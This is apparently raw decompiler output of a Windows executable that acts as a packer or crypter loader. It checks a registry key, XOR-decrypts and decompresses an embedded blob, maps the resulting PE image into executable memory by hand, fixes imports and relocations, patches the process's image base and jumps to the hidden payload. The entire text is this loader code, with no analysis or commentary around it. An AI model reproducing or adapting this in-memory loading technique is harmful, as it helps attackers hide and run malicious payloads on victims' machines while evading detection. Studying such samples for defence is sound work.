/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

// HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName);
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
// LPSTR __stdcall GetCommandLineA();
// BOOL __stdcall CloseHandle(HANDLE hObject);
// LPVOID __stdcall VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// LPSTR __stdcall lstrcpyA(LPSTR lpString1, LPCSTR lpString2);
// HMODULE __stdcall LoadLibraryA(LPCSTR lpLibFileName);
int __cdecl sub_401020(int a1, int a2, unsigned int a3);
// int __usercall start@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>, _DWORD *a4);
FARPROC __cdecl sub_401270(HMODULE hModule, LPCSTR lpProcName);
int __stdcall sub_4012A0(int a1);
int __cdecl sub_401840(int a1, int a2);
LPVOID __cdecl sub_4018B0(SIZE_T dwSize);
int __cdecl sub_4018E0(int a1, _DWORD *a2);
int __cdecl sub_401A40(int a1);
unsigned int __cdecl sub_401A70(char *a1, int a2, unsigned int a3);
int __cdecl sub_401B70(int *a1, char *a2);

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN loc_401237; // weak
_DWORD dword_405000[99] =
{
  16866,
  22016,
  -1471080683,
  768,
  940269151,
  16776960,
  940302943,
  0,
  1061231199,
  117918216,
  1912951829,
  8390407,
  654662239,
  -1275064646,
  -2144692394,
  567102465,
  1264726539,
  1869770784,
  1433020472,
  1851876128,
  410989873,
  1914725730,
  1361785898,
  1329864814,
  1466333708,
  221144420,
  1915703378,
  1162888199,
  960977503,
  1060634632,
  809572046,
  251715672,
  973754716,
  1703992,
  945379935,
  131072,
  941563487,
  1048576,
  1916492383,
  1243513095,
  1913214555,
  20480262,
  2022333717,
  -1069742774,
  -2063180779,
  520440513,
  403397215,
  1244399178,
  1027694427,
  117918216,
  2106216725,
  688278084,
  1250588949,
  1244145738,
  1277524093,
  7632997,
  541809247,
  293668682,
  -1190719419,
  101075525,
  1480284735,
  1952539694,
  -1173614530,
  -2130359700,
  940267555,
  239738368,
  1477122679,
  1936862912,
  154810669,
  1078134346,
  404970773,
  807931978,
  1568240799,
  845377388,
  1747147797,
  573048650,
  1914916373,
  1248098566,
  1912789849,
  139077638,
  843149276,
  1647198248,
  1010903340,
  71992332,
  541141594,
  -1070585724,
  1044460401,
  -2113582512,
  1061280307,
  1244032129,
  1282941516,
  71983713,
  940274003,
  36864,
  940275295,
  306850304,
  1245784798,
  1917465219,
  1550782509
}; // idb
CHAR aRegopenkeya[] = "RegOpenKeyA"; // idb
CHAR LibFileName[] = "advapi32.dll"; // idb
char aDll[5] = ".dll"; // weak
CHAR String2[] = "54953452343543535"; // idb
CHAR ProcName[] = "UnmapViewOfFile"; // idb
CHAR ModuleName[] = "kernel32.dll"; // idb
CHAR aCreatefilemapp[] = "CreateFileMappingA"; // idb
CHAR aKernel32Dll_1[] = "kernel32.dll"; // idb
CHAR aVirtualfree[] = "VirtualFree"; // idb
CHAR aKernel32Dll_2[] = "kernel32.dll"; // idb
CHAR aMapviewoffilee[] = "MapViewOfFileEx"; // idb
CHAR aKernel32Dll_3[] = "kernel32.dll"; // idb
int dword_4092A4 = 0; // weak
int dword_4092A8 = 0; // weak
int dword_4092AC = 0; // weak
int dword_4092B0 = 0; // weak
LPVOID lpAddress = NULL; // idb
int dword_4092B8 = 0; // weak
int dword_4092BC = 0; // weak
int dword_4092C0 = 0; // weak
int dword_4092C4 = 0; // weak
int dword_4092C8 = 0; // weak
int (*dword_4092CC)(void) = NULL; // weak


//----- (00401020) --------------------------------------------------------
int __cdecl sub_401020(int a1, int a2, unsigned int a3)
{
  int result; // eax

  for ( dword_4092AC = 0; dword_4092AC < a3; ++dword_4092AC )
  {
    *(_BYTE *)(dword_4092AC + a1) = *(_BYTE *)(dword_4092AC + a2);
    result = dword_4092AC + 1;
  }
  return result;
}
// 4092AC: using guessed type int dword_4092AC;

//----- (004010B0) --------------------------------------------------------
int __usercall start@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>, _DWORD *a4)
{
  HMODULE v4; // eax
  SIZE_T dwSize; // [esp+Ch] [ebp-8Ch]
  unsigned int v7; // [esp+10h] [ebp-88h]
  char v8[4]; // [esp+14h] [ebp-84h] BYREF
  char *v9; // [esp+18h] [ebp-80h]
  char *v10; // [esp+1Ch] [ebp-7Ch]
  FARPROC v11; // [esp+20h] [ebp-78h]
  _DWORD *v12; // [esp+24h] [ebp-74h]
  unsigned int i; // [esp+94h] [ebp-4h]
  int savedregs; // [esp+98h] [ebp+0h] BYREF

  v10 = (char *)GetModuleHandleA(0);
  v12 = a4;
  dword_4092C4 = (_WORD)a4 == 0;
  if ( !a4 )
    dword_4092C4 = 0;
  if ( dword_4092C4 )
    lpAddress = v12;
  v4 = LoadLibraryA(LibFileName);
  v11 = sub_401270(v4, aRegopenkeya);
  if ( ((int (__stdcall *)(unsigned int, char *, char *))v11)(0x80000000, aDll, v8) )
    return 0;
  v9 = (char *)dword_405000;
  v7 = dword_405000[0];
  dwSize = dword_405000[1];
  for ( i = 0; i < v7; i += 8 )
    *(_DWORD *)&v9[i + 8] ^= 0x380B5A5Fu;
  dword_4092C0 = (int)sub_4018B0(dwSize);
  sub_401A70(v9 + 8, dword_4092C0, v7);
  dword_4092B0 = a2;
  dword_4092A8 = a3;
  dword_4092BC = a1;
  dword_4092C8 = (int)NtCurrentTeb();
  i = (unsigned int)&loc_401237;
  dword_4092B8 = (int)&savedregs;
  if ( dword_4092C4 )
    sub_4018E0(i - (_DWORD)v12, v12);
  else
    sub_4018E0(i - (_DWORD)v10, v10);
  sub_4012A0(dword_4092C0);
  return dword_4092CC();
}
// 4092CC: invalid function type has been ignored
// 4092A8: using guessed type int dword_4092A8;
// 4092B0: using guessed type int dword_4092B0;
// 4092B8: using guessed type int dword_4092B8;
// 4092BC: using guessed type int dword_4092BC;
// 4092C0: using guessed type int dword_4092C0;
// 4092C4: using guessed type int dword_4092C4;
// 4092C8: using guessed type int dword_4092C8;
// 4092CC: using guessed type int (*dword_4092CC)(void);

//----- (00401270) --------------------------------------------------------
FARPROC __cdecl sub_401270(HMODULE hModule, LPCSTR lpProcName)
{
  GetCommandLineA();
  return GetProcAddress(hModule, lpProcName);
}

//----- (004012A0) --------------------------------------------------------
int __stdcall sub_4012A0(int a1)
{
  HMODULE v2; // eax
  HMODULE v3; // eax
  HMODULE v4; // eax
  FARPROC v5; // eax
  HMODULE v6; // eax
  char *j; // [esp+4h] [ebp-BCh]
  char *v8; // [esp+8h] [ebp-B8h]
  _DWORD *v9; // [esp+Ch] [ebp-B4h]
  CHAR String1[112]; // [esp+10h] [ebp-B0h] BYREF
  int v11; // [esp+80h] [ebp-40h]
  char *v12; // [esp+84h] [ebp-3Ch]
  BOOL (__stdcall *UnmapViewOfFile)(LPCVOID); // [esp+88h] [ebp-38h]
  char *v14; // [esp+8Ch] [ebp-34h]
  char *v15; // [esp+90h] [ebp-30h]
  unsigned int v16; // [esp+94h] [ebp-2Ch]
  char *v17; // [esp+98h] [ebp-28h]
  int *v18; // [esp+9Ch] [ebp-24h]
  char *k; // [esp+A0h] [ebp-20h]
  HMODULE hModule; // [esp+A4h] [ebp-1Ch]
  int v21; // [esp+A8h] [ebp-18h]
  LPVOID (__stdcall *MapViewOfFileEx)(HANDLE, DWORD, DWORD, DWORD, SIZE_T, LPVOID); // [esp+ACh] [ebp-14h]
  FARPROC v23; // [esp+B0h] [ebp-10h]
  unsigned int i; // [esp+B4h] [ebp-Ch]
  HANDLE hObject; // [esp+B8h] [ebp-8h]
  HANDLE (__stdcall *CreateFileMappingA)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR); // [esp+BCh] [ebp-4h]

  lstrcpyA(String1, String2);
  v12 = (char *)(*(_DWORD *)(a1 + 60) + a1);
  v17 = &v12[*((unsigned __int16 *)v12 + 10) + 24];
  v15 = (char *)VirtualAlloc(0, *((_DWORD *)v12 + 20), 0x3000u, 0x40u);
  if ( !v15 )
    return 0;
  sub_401020((int)v15, a1, *(_DWORD *)(a1 + 60) + 40 * *((unsigned __int16 *)v12 + 3) + 312);
  v2 = GetModuleHandleA(ModuleName);
  UnmapViewOfFile = (BOOL (__stdcall *)(LPCVOID))GetProcAddress(v2, ProcName);
  v3 = GetModuleHandleA(aKernel32Dll_1);
  CreateFileMappingA = (HANDLE (__stdcall *)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR))GetProcAddress(v3, aCreatefilemapp);
  for ( i = 0; i < *((unsigned __int16 *)v12 + 3); ++i )
  {
    if ( *((_DWORD *)v17 + 5) )
    {
      if ( *((_DWORD *)v17 + 4) )
        sub_401020(
          (int)&v15[*((_DWORD *)v17 + 3)],
          *((_DWORD *)v17 + 5) + a1,
          *((_DWORD *)v12 + 15)
        * ((unsigned int)(*((_DWORD *)v17 + 4) + *((_DWORD *)v12 + 15) - 1)
         / *((_DWORD *)v12 + 15)));
    }
    v17 += 40;
  }
  v8 = v15;
  v12 = &v15[*((_DWORD *)v15 + 15)];
  hObject = CreateFileMappingA((HANDLE)-1, 0, 4, 0, *((_DWORD *)v12 + 20), 0);
  if ( !hObject )
    return 0;
  v4 = GetModuleHandleA(aKernel32Dll_2);
  v23 = sub_401270(v4, aVirtualfree);
  for ( j = &v15[*((_DWORD *)v12 + 32)]; *((_DWORD *)j + 4); j += 20 )
  {
    hModule = LoadLibraryA(&v15[*((_DWORD *)j + 3)]);
    if ( *(_DWORD *)j )
    {
      v18 = (int *)&v15[*(_DWORD *)j];
      v14 = &v15[*((_DWORD *)j + 4)];
    }
    else
    {
      v18 = (int *)&v15[*((_DWORD *)j + 4)];
      v14 = &v15[*(_DWORD *)j];
    }
    v21 = 0;
    if ( *((_DWORD *)j + 4) && *(_DWORD *)j )
      v21 = 1;
    while ( *v18 )
    {
      if ( *v18 >= 0 )
        v5 = sub_401270(hModule, &v15[*v18 + 2]);
      else
        v5 = sub_401270(hModule, (LPCSTR)(*v18 & 0x7FFFFFFF));
      *v18 = (int)v5;
      if ( !*v18 )
        return 0;
      if ( v21 )
        *(_DWORD *)v14 = *v18;
      ++v18;
      v14 += 4;
    }
  }
  if ( dword_4092C4 )
  {
    v11 = (int)lpAddress - *((_DWORD *)v12 + 13);
    if ( *((_DWORD *)v12 + 41) )
    {
      for ( k = &v8[*((_DWORD *)v12 + 40)]; *((_DWORD *)k + 1); k += *((_DWORD *)k + 1) )
      {
        v16 = (unsigned int)(*((_DWORD *)k + 1) - 8) >> 1;
        v9 = k + 8;
        for ( i = 0; i < v16; ++i )
        {
          if ( (int)*((unsigned __int16 *)v9 + i) >> 12 == 3 )
            *(_DWORD *)&v15[*(_DWORD *)k + (*((_WORD *)v9 + i) & 0xFFF)] += v11;
        }
      }
    }
  }
  v6 = GetModuleHandleA(aKernel32Dll_3);
  MapViewOfFileEx = (LPVOID (__stdcall *)(HANDLE, DWORD, DWORD, DWORD, SIZE_T, LPVOID))GetProcAddress(
                                                                                         v6,
                                                                                         aMapviewoffilee);
  if ( dword_4092C4 )
    dword_4092A4 = (int)MapViewOfFileEx(hObject, 34, 0, 0, 0, lpAddress);
  else
    dword_4092A4 = (int)MapViewOfFileEx(hObject, 34, 0, 0, 0, *((LPVOID *)v12 + 13));
  if ( !dword_4092A4 )
  {
    if ( dword_4092C4 )
    {
      if ( !UnmapViewOfFile(lpAddress) && !((int (__stdcall *)(LPVOID, _DWORD, int))v23)(lpAddress, 0, 0x8000) )
        return 0;
    }
    else if ( !UnmapViewOfFile(*((LPCVOID *)v12 + 13))
           && !((int (__stdcall *)(_DWORD, _DWORD, int))v23)(*((_DWORD *)v12 + 13), 0, 0x8000) )
    {
      return 0;
    }
    if ( dword_4092C4 )
      dword_4092A4 = (int)MapViewOfFileEx(hObject, 34, 0, 0, 0, lpAddress);
    else
      dword_4092A4 = (int)MapViewOfFileEx(hObject, 34, 0, 0, 0, *((LPVOID *)v12 + 13));
    if ( !dword_4092A4 )
    {
      if ( dword_4092C4 )
        dword_4092A4 = (int)VirtualAlloc(lpAddress, *((_DWORD *)v12 + 20), 0x3000u, 0x40u);
      else
        dword_4092A4 = (int)VirtualAlloc(*((LPVOID *)v12 + 13), *((_DWORD *)v12 + 20), 0x3000u, 0x40u);
    }
  }
  CloseHandle(hObject);
  sub_401020(dword_4092A4, (int)v15, *((_DWORD *)v12 + 20));
  if ( dword_4092C4 )
    sub_401840((int)lpAddress, *((_DWORD *)v12 + 10) + dword_4092A4);
  else
    sub_401A40(dword_4092A4);
  dword_4092CC = (int (*)(void))(*((_DWORD *)v12 + 10) + dword_4092A4);
  *((_DWORD *)v12 + 10) = dword_4092CC;
  return 1;
}
// 4092A4: using guessed type int dword_4092A4;
// 4092C4: using guessed type int dword_4092C4;
// 4092CC: using guessed type int (*dword_4092CC)(void);

//----- (00401840) --------------------------------------------------------
int __cdecl sub_401840(int a1, int a2)
{
  _DWORD *v3; // [esp+4h] [ebp-8h]

  v3 = *(_DWORD **)(*(_DWORD *)(*(_DWORD *)(dword_4092C8 + 48) + 12) + 12);
  do
  {
    if ( !v3 )
      return 0;
    if ( v3[6] == a1 )
    {
      v3[7] = a2;
      return 1;
    }
    v3 = (_DWORD *)*v3;
  }
  while ( v3 != *(_DWORD **)(*(_DWORD *)(*(_DWORD *)(dword_4092C8 + 48) + 12) + 12) );
  return 0;
}
// 4092C8: using guessed type int dword_4092C8;

//----- (004018B0) --------------------------------------------------------
LPVOID __cdecl sub_4018B0(SIZE_T dwSize)
{
  return VirtualAlloc(0, dwSize, 0x3000u, 4u);
}

//----- (004018E0) --------------------------------------------------------
int __cdecl sub_4018E0(int a1, _DWORD *a2)
{
  _DWORD *v3; // [esp+4h] [ebp-20h]
  _DWORD *v4; // [esp+Ch] [ebp-18h]
  int v5; // [esp+10h] [ebp-14h]
  SIZE_T *v6; // [esp+14h] [ebp-10h]
  unsigned int v7; // [esp+18h] [ebp-Ch]
  _DWORD *i; // [esp+1Ch] [ebp-8h]
  unsigned int j; // [esp+20h] [ebp-4h]

  if ( dword_4092C4 )
    v3 = lpAddress;
  else
    v3 = a2;
  v6 = (_DWORD *)((char *)v3 + v3[15]);
  dword_4092A4 = (int)VirtualAlloc(0, v6[20], 0x3000u, 0x40u);
  if ( dword_4092A4 )
  {
    sub_401020(dword_4092A4, (int)v3, v6[20]);
    v5 = dword_4092A4 - (_DWORD)v3;
    if ( v6[41] )
    {
      for ( i = (_DWORD *)((char *)v3 + v6[40]); i[1]; i = (_DWORD *)((char *)i + i[1]) )
      {
        v7 = (unsigned int)(i[1] - 8) >> 1;
        v4 = i + 2;
        for ( j = 0; j < v7; ++j )
        {
          if ( (int)*((unsigned __int16 *)v4 + j) >> 12 == 3 )
            *(_DWORD *)(*i + dword_4092A4 + (*((_WORD *)v4 + j) & 0xFFF)) += v5;
        }
      }
    }
    __asm { jmp     edx }
  }
  return 2;
}
// 4092A4: using guessed type int dword_4092A4;
// 4092C4: using guessed type int dword_4092C4;

//----- (00401A40) --------------------------------------------------------
int __cdecl sub_401A40(int a1)
{
  int result; // eax

  result = *(_DWORD *)(dword_4092C8 + 48);
  *(_DWORD *)(result + 8) = a1;
  return result;
}
// 4092C8: using guessed type int dword_4092C8;

//----- (00401A70) --------------------------------------------------------
unsigned int __cdecl sub_401A70(char *a1, int a2, unsigned int a3)
{
  int v3; // eax
  int v4; // eax
  unsigned int result; // eax
  int v6; // [esp+0h] [ebp-1Ch] BYREF
  unsigned int i; // [esp+4h] [ebp-18h]
  int v8; // [esp+8h] [ebp-14h]
  char v9; // [esp+Fh] [ebp-Dh]
  unsigned int v10; // [esp+10h] [ebp-Ch] BYREF
  unsigned int v11; // [esp+14h] [ebp-8h]
  char v12; // [esp+1Bh] [ebp-1h]

  v11 = 1;
  v9 = *a1;
  v8 = 0;
  do
  {
    v12 = a1[v11++];
    if ( v12 == v9 )
    {
      if ( a1[v11] )
      {
        v3 = sub_401B70((int *)&v10, &a1[v11]);
        v11 += v3;
        v4 = sub_401B70(&v6, &a1[v11]);
        v11 += v4;
        for ( i = 0; i < v10; ++i )
        {
          *(_BYTE *)(v8 + a2) = *(_BYTE *)(a2 + v8 - v6);
          ++v8;
        }
      }
      else
      {
        *(_BYTE *)(v8 + a2) = v9;
        ++v8;
        ++v11;
      }
    }
    else
    {
      *(_BYTE *)(v8 + a2) = v12;
      ++v8;
    }
    result = v11;
  }
  while ( v11 < a3 );
  return result;
}

//----- (00401B70) --------------------------------------------------------
int __cdecl sub_401B70(int *a1, char *a2)
{
  int v3; // [esp+4h] [ebp-Ch]
  char v4; // [esp+8h] [ebp-8h]
  int v5; // [esp+Ch] [ebp-4h]

  v5 = 0;
  v3 = 0;
  do
  {
    v4 = *a2++;
    v5 = (v5 << 7) | v4 & 0x7F;
    ++v3;
  }
  while ( (v4 & 0x80) != 0 );
  *a1 = v5;
  return v3;
}

// nfuncs=10 queued=10 decompiled=10 lumina nreq=0 worse=0 better=0
// ALL OK, 10 function(s) have been successfully decompiled
